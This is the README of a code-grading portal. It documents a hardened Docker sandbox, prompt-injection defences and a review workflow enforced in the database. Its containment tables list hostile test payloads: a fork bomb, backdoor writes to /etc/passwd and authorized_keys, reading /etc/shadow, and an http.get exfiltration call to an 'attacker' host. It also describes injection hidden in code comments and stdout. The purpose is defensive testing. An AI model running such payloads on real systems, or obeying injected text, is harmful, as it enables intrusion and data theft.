# verdict-desk

An AI-powered code-grading & doubt-resolution portal. Students submit code that is graded against test cases in a
**hardened Docker sandbox**, receive **AI code-quality feedback**, and post doubts to a board where an **AI drafts
answers that a teacher must review** (draft → pending → approved) before other students can see them.

The build is organised around the five things the evaluator grades: **sandbox safety**, **prompt-injection
resilience**, **approval-workflow correctness (enforced in the DB)**, **code structure**, and **stack + LLM
integration**. The [Security & threat model](#security--threat-model) section is the heart of this README.

---

## Contents
- [Quick start](#quick-start) · [What you can try](#what-you-can-try) · [Question kinds](#question-kinds) ·
  [Architecture](#architecture)
- [Security & threat model](#security--threat-model): [sandbox](#1-the-grading-sandbox) · [injection](#2-prompt-injection--llm-safety) · [state machine](#3-the-answer-state-machine-enforced-in-the-database) · [residual risks](#4-residual-risks-honest-disclosure)
- [Why PostgreSQL, not MongoDB](#why-postgresql-not-mongodb-the-mern-question) · [Data model](#data-model) · [Testing](#testing) · [Env & structure](#configuration)

---

## Quick start

**Prerequisites:** Node ≥ 20 (developed on 26; `.nvmrc` pins 20 for CI parity) · pnpm 9 (`npm i -g pnpm@9`) ·
Docker running (Docker Desktop or OrbStack).

```bash
cp .env.example .env      # defaults work out of the box — MOCK_LLM=1, no API key needed
make dev                  # installs deps, starts Postgres, migrates, seeds, pre-pulls node:20-alpine, runs web + api
```

Open **http://localhost:3000** (the API is at :4000, proxied same-origin via `/api/*`). Seeded logins (password
`password`): **`student@verdict.dev`** (student) and **`teacher@verdict.dev`** (teacher).

> **Keyless by design.** `MOCK_LLM=1` (the default) makes every AI feature return canned, schema-valid JSON with no
> network call, so the whole app is demonstrable without an NVIDIA key. To use a real model, set `MOCK_LLM=0` and
> provide an OpenAI-compatible triple (`LLM_BASE_URL` / `LLM_API_KEY` / `LLM_MODEL`); NIM is the default base URL.

## What you can try

| Feature | How |
|---|---|
| **Grade a submission** | Log in as the student → open *Sum of Two Numbers* → paste a solution → **Submit**. You get per-test pass/fail + a weighted score. Hidden test cases show **pass/fail only** (no I/O). |
| **See the sandbox contain hostile code** | `bash scripts/abuse-demo.sh` (with the stack up). Proves: correct→100%, `while(1)`→TIMEOUT, fork bomb→killed, network→blocked, fs-write→blocked, 100MB stdout→truncated with **stable API memory**, and a queue-stall attempt→contained. Exits non-zero if any check fails. |
| **AI feedback** | After grading, an **"🤖 AI-generated · UNREVIEWED"** card appears with a severity + suggestions. |
| **Doubts → teacher review** | As the student, post a doubt on **Doubts**. An AI drafts an answer that stays hidden. As the **teacher**, open **Review queue**, see the doubt + draft side-by-side, and Approve/Edit/Reject (optionally with a **reject reason**, persisted and shown to the doubt's author on the rejected answer). Only approved answers become visible to other students, and the doubt page **live-polls** while an answer is still DRAFT/PENDING_REVIEW so an approval/rejection shows up without a manual refresh. |
| **Answer an MCQ or INTEGER question** | Open a non-CODE problem — it's graded **instantly, server-side**, no sandbox or LLM involved (see [Question kinds](#question-kinds)). |
| **Recover a failed AI feedback generation** | If a feedback generation is flagged **FAILED**, the results card shows a **Regenerate** button — it re-fires generation without needing a new submission. |
| **Prove the DB rejects illegal transitions** | `docker compose exec -T db psql -U verdict -d verdict -c "UPDATE answers SET state='APPROVED' WHERE state='REJECTED';"` → **the database itself errors.** |

### Question kinds

Problems carry a `kind`: `CODE`, `MCQ`, or `INTEGER`.

- **CODE** is graded the "hard way" — queued, run against test cases in the hardened Docker sandbox described below,
  and (fire-and-forget, after grading) gets an AI code-quality feedback pass.
- **MCQ / INTEGER are graded instantly, in-process, server-side** — no sandbox, no queue, no LLM call. The submitted
  answer is validated and normalized (`objective-grading.ts`), then compared against the problem's `answerKey`
  (exact option-id match for MCQ, canonicalized numeric comparison for INTEGER, so `"007"` and `"-0"` grade sanely).
  The submission is **born terminal** — `feedbackStatus: SKIPPED` — since there is nothing for an LLM to critique
  about a multiple-choice pick. A malformed/out-of-range answer is rejected with a generic `400` that never echoes
  the valid option ids or the correct value.

## Architecture

A **pnpm-workspaces monorepo**: `apps/web` (Next.js 15 App Router) + `apps/api` (NestJS 11) + a Postgres-only
`docker-compose.yml`. The web app proxies `/api/*` to the API via a Next.js rewrite, so the browser is always
same-origin (JWT-in-httpOnly-cookie auth works with no CORS friction).

**The API runs on the host, not in a container — on purpose.** It grades by shelling out to `docker run` to spawn a
hardened, throwaway container per submission, so it needs the host Docker socket. Containerising the API would mean
mounting the Docker socket into a container (a well-known privilege-escalation footgun) or docker-in-docker. Keeping
the grader on the host and the *untrusted code* in short-lived locked-down containers is the safer split.

Cross-cutting from day one: a global exception filter with a request-id error envelope, structured logging,
env-var config with `.env.example`, and **Prisma migrations only** (never `db push`, which would silently skip the
raw-SQL triggers below).

---

## Security & threat model

### 1. The grading sandbox

**One hardened container per submission.** The host writes the untrusted `main.js`, a trusted dependency-free
`harness.js`, and a `manifest.json` into a fresh temp dir, bind-mounts it **read-only** at `/work`, and runs
`node /work/harness.js`. The harness runs each test case sequentially and emits one JSON result blob. Every launch
uses this exact argv (assembled as an **array, never a shell string** — command injection in a grader is fatal):

```
docker run --rm --init --network none --memory 256m --memory-swap 256m --cpus 0.5 \
  --pids-limit 64 --read-only --tmpfs /tmp:rw,noexec,nosuid,size=16m \
  --cap-drop ALL --cap-add SETUID --cap-add SETGID --cap-add KILL --security-opt no-new-privileges \
  -v <tmp>:/work:ro -w /work node:20-alpine node /work/harness.js
```

| Flag | Defends against |
|---|---|
| `--network none` | Data exfiltration / SSRF / calling home (verified: a `fetch()` fails). |
| `--memory 256m --memory-swap 256m` | Memory bombs (equal values ⇒ **zero swap**, so it can't spill to disk). |
| `--cpus 0.5` | CPU starvation of the host. |
| `--pids-limit 64` | **Fork bombs** — the kernel caps the process count (verified: a fork bomb is contained, docker daemon stays responsive). |
| `--read-only` + `-v …:/work:ro` | Filesystem tampering / persistence (verified: writing to `/work` or `/etc` fails). |
| `--tmpfs /tmp:…,noexec,nosuid` | Gives a small scratch space that **can't execute** dropped binaries or gain setuid. |
| `--cap-drop ALL` + `--cap-add SETUID` + `--cap-add SETGID` + `--cap-add KILL` | Strips every Linux capability, then re-adds **only** the three the harness needs: `SETUID`/`SETGID` to drop the submission's uid itself, and `KILL` to SIGKILL a timed-out child that no longer shares its uid (see below); `no-new-privileges` still blocks privilege *gain* on execve. |
| `--init` | tini reaps orphaned/forked grandchildren (PID 1). |
| `--rm` | The container (and everything a payload did to its own filesystem) is destroyed on exit. |

**PID 1 (tini + `harness.js`) now runs as in-container root** — there is no `--user` flag. This looks like it
weakens the sandbox, but it does the opposite: it lets the *trusted* harness itself call `setuid(65534)` /
`setgid(65534)` (via Node's `spawn(..., { uid: 65534, gid: 65534 })`) on **every submission child it spawns**, so
the untrusted `main.js` still **never** runs as root — it runs at the same unprivileged uid as before, just no
longer as the *same* uid as PID 1. `no-new-privileges` still holds: it blocks a process from **gaining** privilege
on `execve` (e.g. via a setuid binary), not a root process **voluntarily dropping** privilege via `setuid()`, which
is what's happening here. `--cap-drop ALL` still strips everything else; `SETUID`/`SETGID`/`KILL` are the only three
capabilities added back, and only PID 1 has them — the submission child, running at uid 65534, has none. The
explicit trade: in-container root for one trusted, dependency-free, code-reviewed file (`harness.js`), in exchange
for closing the `/proc/1/fd/1` self-injection gap below.

**The grader's own memory is protected separately from the container.** Docker's `--memory` protects the host
*kernel*; it does nothing for the API's Node heap as it *reads* the container's output. A 100MB stdout flood would
OOM a naive `stdout += chunk` reader. So output is capped **while streaming** at two layers — inside the harness per
test case (64 KiB) and on the host reading the container (a few MB) — using a `CappedCollector` that stores `Buffer`
slices up to the cap, keeps draining the pipe, and `Buffer.concat`s once (so a multi-byte UTF-8 char split across
chunks isn't corrupted). Under a 100MB flood the API's RSS grows by **~2MB**. Timeouts are layered too: a per-case
timeout (SIGKILL to the child's process group), a hard per-case fallback, and an outer wall-clock `docker kill`
backstop — so an infinite loop, a pipe-holding detached grandchild, or a wedged harness can never stall a grading
worker. **`scripts/abuse-demo.sh` is the runnable evidence for all of this.**

**Containment matrix — every row live-verified end-to-end** (submitted as a real solution; each payload prints its
own outcome to stdout). In all cases the submission ended **FAILED** (never a forged PASS), `/health` stayed **200**
throughout, and no `verdict-sub-*` container was left behind:

| Hostile submission | Guardrail that stops it | Observed result |
|---|---|---|
| `while (true) {}` — infinite loop | per-case **5 s** wall-clock → `SIGKILL` of the child's process group | every case **TIMEOUT** (~5.0 s) → **FAILED** |
| `for(;;) child_process.spawn(node…)` — fork bomb | `--pids-limit 64` + process-group kill + `--init`/tini reaping | **host process count never moves**, no leaked container → **FAILED** |
| Delete/overwrite the grader & write a backdoor (`fs.unlinkSync('/work/harness.js')`, `writeFileSync('/etc/passwd'…)`, `/root/.ssh/authorized_keys`) | `--read-only` + `-v …/work:ro` | every write **blocked — `EROFS` / `EACCES`**; grader files untouched |
| Exfiltrate the answer key (`http.get('http://attacker…', manifest)`) | `--network none` **and** the answer key is withheld from the container | request can't connect (killed at timeout); the manifest exposes only `{id, input}` — `hasExpectedOutput=false`, so there is **nothing to steal** |
| De-root / read host secrets (`fs.readFileSync('/etc/shadow')`) | harness `spawn(..., {uid:65534,gid:65534})` + `--cap-drop ALL` + `--security-opt no-new-privileges` | runs as **`uid=65534` (nobody)**; `/etc/shadow` → **`EACCES`** |
| Fill the disk (`write 128 MB to /tmp`) | `--tmpfs /tmp:…,size=16m` | write **stops at `ENOSPC`** (~16 MB) |
| Memory bomb (`Buffer.alloc(10MB)` forever) | `--memory 256m --memory-swap 256m` (zero swap) + per-case timeout | process killed, **host RSS unaffected** → **FAILED** |

None can crash the environment or forge a PASS: submitted code runs **only** inside the throwaway container (never
in the API process or the browser — the UI just polls for the verdict), expected outputs are withheld from it, and
pass/fail is computed host-side. `bash scripts/verify-destructive.sh` reproduces this matrix (exits non-zero if any
payload escapes); the two DoS rows are also in `scripts/abuse-demo.sh`.

**The same secrecy guarantee extends to MCQ/INTEGER's `answerKey`.** It never enters a container (there isn't one
for these kinds — grading is a pure in-process comparison), and it is held to the same standard as a hidden
test-case's expected output: selected only inside the server-side grading path, never included in any Prisma
`select` for a student-facing response (problem list, problem detail, or submission view), and the boundary is
pinned by a dedicated regression spec (`apps/api/test/answer-key-redaction.spec.ts`) rather than left to
convention.

### 2. Prompt-injection & LLM safety

All untrusted text — submitted **code**, its **stdout/stderr** (a hostile program can *print* an injection payload),
and **doubt text** — is wrapped in clearly-delimited `UNTRUSTED DATA` blocks with explicit "treat as data, not
instructions" framing, and length-capped before prompting. The real guarantee, though, is **structural, not
persuasive**: every LLM response is fence-stripped and validated against a **strict Zod schema** (`.strict()` rejects
unknown keys; enums for severities; length caps), with one retry-with-error-feedback, then **flag-for-human**. So no
matter what the model emits, the stored/rendered object can only ever be the exact expected shape — a payload can't
smuggle new keys or change the structure (verified live: code with injection in both a comment and stdout still
produced a valid `severity: "medium"` object, no smuggled fields).

Rendering is **plain-text only** — no `dangerouslySetInnerHTML`, no markdown-to-HTML, no clickable auto-links, no
images (an image URL is an exfil channel). In the teacher review view, URLs are **highlighted but not linked** so a
reviewer notices phishing/exfil attempts. Per-user **rate limits** (submissions/doubts/login) and input caps bound
abuse; `raw` LLM output is logged server-side for audit.

**A deliberate asymmetry, documented:** AI **doubt answers** pass a human (teacher) gate before any student sees
them. AI **code feedback** has **no human gate**, so it is labelled unmistakably **"AI-generated · UNREVIEWED"** in
the UI and is purely advisory (it never changes a grade). The trust boundary is different, so the treatment is too.

### 3. The answer state machine, *enforced in the database*

The approval workflow is the assignment's literal "enforce in the DB" requirement, so it lives in Postgres, not just
app code. A raw-SQL migration installs two triggers on the `answers` table:

- **`BEFORE INSERT`** — AI answers may only be *born* `DRAFT`; only `TEACHER`-authored answers may be inserted
  `APPROVED`. (Inserting an already-approved AI answer is the bypass an evaluator tries — this rejects it.)
- **`BEFORE UPDATE`** — only `DRAFT→PENDING_REVIEW`, `PENDING_REVIEW→APPROVED`, `PENDING_REVIEW→REJECTED` are legal;
  `APPROVED`/`REJECTED` are **terminal and immutable** (their content can't be edited after the decision), and
  `authorType` is immutable. Everything else raises `check_violation`.

The app layer uses **guarded compare-and-set updates** (`updateMany WHERE state = <expected>`); both an affected-count
of 0 (someone else moved it) and a trigger exception map to **HTTP 409**, never a 500. **Answer visibility is enforced
in the query** (`WHERE state='APPROVED' OR doubt.authorId = viewer OR viewer is TEACHER`), not in the UI — a
non-author student can never receive a non-approved answer's content, and a teacher's edit replaces the draft students
see (the raw pre-edit text is never shipped). Every transition writes an append-only `ReviewAudit` row. Teacher-only
routes are `RolesGuard`-protected (a student hitting the review queue gets 403).

This is verified by an independent **16-case raw-SQL attack matrix** (every illegal transition/insert rejected by the
DB, every legal one allowed) plus state-machine unit tests — see [Testing](#testing).

### 4. Residual risks (honest disclosure)

- ~~**Same-uid `/proc/<pid>/fd` write inside the container.**~~ **CLOSED.** `main.js` and the harness (PID 1) used
  to share uid 65534, so a payload could write to `/proc/1/fd/1` to corrupt/replace *its own* result blob. Fixed by
  giving them **distinct uids**: PID 1 (tini + `harness.js`) now runs as in-container **root**, with only the
  `SETUID`/`SETGID`/`KILL` capabilities added back (`--cap-drop ALL --cap-add SETUID --cap-add SETGID --cap-add KILL`,
  `--user` removed —
  see [§1](#1-the-grading-sandbox)), and the harness spawns every submission child via
  `spawn(main.js, { uid: 65534, gid: 65534 })`. `CAP_KILL` is required *by* that separation: a process may only
  signal another whose uid matches its own unless it holds `CAP_KILL`, so without it the harness could no longer
  SIGKILL a timed-out child and every per-case timeout degraded to `ERROR` (`kill EPERM`) instead of `TIMEOUT` —
  caught by re-running `scripts/abuse-demo.sh` after the uid change. It grants nothing outside the container's
  own PID namespace. `no-new-privileges` is unaffected (it blocks privilege *gain* on
  execve, not a root process voluntarily calling `setuid()`). The submission still **never** runs as root — it runs
  at the exact same unprivileged uid as before, just no longer the *same* uid as PID 1 — so `/proc/1/fd/1` is now
  owned by a uid the submission doesn't have, and the write fails **`EACCES`/`EPERM`**. The explicit trade: an
  in-container root PID 1, for one trusted, dependency-free, code-reviewed file. Verified end-to-end (real Docker,
  no HTTP layer) by `scripts/verify-uid-separation.sh`: (1) the injection attempt is rejected with `EACCES` and the
  harness's own result stream stays intact for the other cases, (2) the submission child reports `uid=65534` while
  a same-argv probe confirms PID 1 is `uid=0`, (3) a normal correct solution still grades `PASS` through the
  identical path, (4) two of the destructive-payload classes above (`/work` write, outbound network) are
  re-verified still contained at the Docker level. **This script runs in CI** (`sandbox-uid-separation` job), so
  the guarantee is enforced on every push rather than resting on someone remembering to run it.
  **Fail-closed, not fail-quiet.** The separation only holds while the harness starts as root, and the harness can
  only *observe* its own uid — it cannot know it was *meant* to be root. So `docker-args.ts` states the
  requirement explicitly with `-e VERDICT_REQUIRE_UID_DROP=1`, and `harness.js` **refuses to grade at all**
  (`{fatal:true}` -> submission `ERROR`) if that flag is set but it cannot drop privileges. Without this, a
  container that started non-root for any reason the argv doesn't control — a base image adding `USER`, a
  daemon-level default, uid remapping — would silently run submissions at the harness's own uid and reopen this
  gap with every test still passing. A security property that can degrade silently is not a property; the refusal
  is covered by a Docker-free unit test (`harness-runtime.spec.ts`).
- **Hidden test-case *inputs* (not expected outputs) are readable** from the mounted `manifest.json` in the
  one-container-per-submission model — an accepted latency/confidentiality trade-off; the confidentiality that
  matters (expected outputs) is preserved.
- **Static untrusted-data delimiter** in prompts (no per-request nonce) — a doubt could attempt a delimiter
  break-out, but the teacher-review gate and the strict Zod schema contain the blast radius; a nonce would be the
  next hardening step.
- **The doubt author can see their own pending draft via the API** (permitted by the visibility rule "asker sees own
  pending"); the UI conservatively hides it behind an "awaiting review" note.

---

## Why PostgreSQL, not MongoDB (the "MERN" question)

The brief reads MERN-flavoured, but the grading requirement is that the approval workflow is **enforced**, not merely
respected by application code. That is only truly satisfiable with **database-level constraints**: Postgres
`BEFORE INSERT`/`BEFORE UPDATE` triggers reject an illegal state change **even against raw SQL** that bypasses the
app entirely — a guarantee Mongoose (application-layer validation) structurally cannot make. Since the answer state
machine is the single most-graded requirement, the datastore is chosen to make it airtight. Relational modelling also
fits the data (users → submissions → per-test results; doubts → answers → audit) cleanly. The rest of the stack stays
deliberately boring; the one novelty budget is spent on LangGraph for the doubt-answer pipeline.

## Data model

`User` (role `STUDENT|TEACHER`) · `Problem` → `TestCase` (input/expected, `hidden`, weight) · `Submission`
(status, score) → `TestResult` (per case; hidden cases redacted in student responses) · `AiFeedback` (1:1, validated
JSON) · `Doubt` → `Answer` (`authorType AI|TEACHER`, `state DRAFT|PENDING_REVIEW|APPROVED|REJECTED`) → `ReviewAudit`
(append-only). UUID primary keys throughout (non-enumerable — closes IDOR/enumeration on submissions/doubts/answers).

## Testing

```bash
pnpm test                      # 222 unit tests / 29 suites: state machine, redaction (incl. answerKey), Zod gates,
                                # caps, objective grading, verdict/scoring — DB/Docker/network-free (what CI runs)
bash scripts/abuse-demo.sh          # sandbox evidence artifact (needs the stack up): 7 containment assertions
bash scripts/verify-destructive.sh  # destructive-payload matrix: fs destruction, key exfil, de-root, disk/mem bombs
bash scripts/verify-uid-separation.sh  # proves the /proc/1/fd/1 residual is closed (talks to Docker directly)
# e2e (needs DB, MOCK mode) — 9 specs: the happy path (grade -> hidden-case redaction -> doubt -> AI draft ->
# teacher approval -> visible) plus teacher approve/reject-with-reason visibility, rate-limit 429, input caps,
# MCQ/INTEGER grading with answerKey-absence assertions, and feedback regenerate:
docker compose up -d --wait db && pnpm --filter @verdict/api prisma:deploy && pnpm --filter @verdict/api seed
MOCK_LLM=1 pnpm --filter @verdict/api test:e2e
```

The state machine was additionally verified with a raw-SQL attack matrix (illegal `UPDATE`/`INSERT` rejected by the
DB) and the full student + teacher flows were exercised end-to-end in a real browser. CI (GitHub Actions) runs lint,
typecheck, and the DB-free unit suite on every push, plus a headless-browser smoke job (login → docket → MCQ submit
→ verdict) against a fully booted stack.

## License

MIT — see [LICENSE](LICENSE). Third-party problem data (DeepMind CodeContests, Apache-2.0) is attributed in
[NOTICE](NOTICE), which also records the modifications made to it.

## Configuration

All config is env-driven; see **`.env.example`** for the full list with safe local defaults. Key vars: `DATABASE_URL`,
`API_PORT` (4000), `WEB_PORT` (3000), `JWT_SECRET`, and the LLM triple `MOCK_LLM` / `LLM_BASE_URL` / `LLM_API_KEY` /
`LLM_MODEL`. `make help` lists the dev targets (`make dev`, `db-up`, `migrate`, `seed`, `reset`, …).

**Project layout:** `apps/api` (NestJS — `sandbox/`, `submissions/`, `ai/`, `doubts/`, `review/`, `auth/`,
`prisma/`) · `apps/web` (Next.js App Router) · `scripts/abuse-demo.sh` · `docker-compose.yml` · `Makefile`.

## Sample problem data

The seed is a **28-problem docket**: 4 CODE problems inlined in `prisma/seed.ts` plus 24 from JSON-driven,
idempotent seed files under `apps/api/prisma/data/` — `code-problems.json` (11 additional easy stdin/stdout
problems curated from [DeepMind CodeContests](https://huggingface.co/datasets/deepmind/code_contests) (HuggingFace,
Apache-2.0), each verified by running a correct JS solution against every one of its test cases) and
`objective-problems.json` (8 hand-curated MCQ + 5 hand-curated INTEGER questions). Both files were fetched/authored
once at authoring time — the checked-in JSON is the only artifact the seed script reads, so `pnpm seed` stays fully
offline with no network access or dataset dependency at runtime, and re-seeding is idempotent (it upserts problems
and does not delete existing `TestCase` rows).

## What v1 intentionally does not do

JS-only sandbox (Python re-enters trivially — same runner), no registration/multi-tenancy/notifications/websockets,
no ReviewAudit UI (the writes exist). These were scoped out to spend the time budget on the five graded axes above.
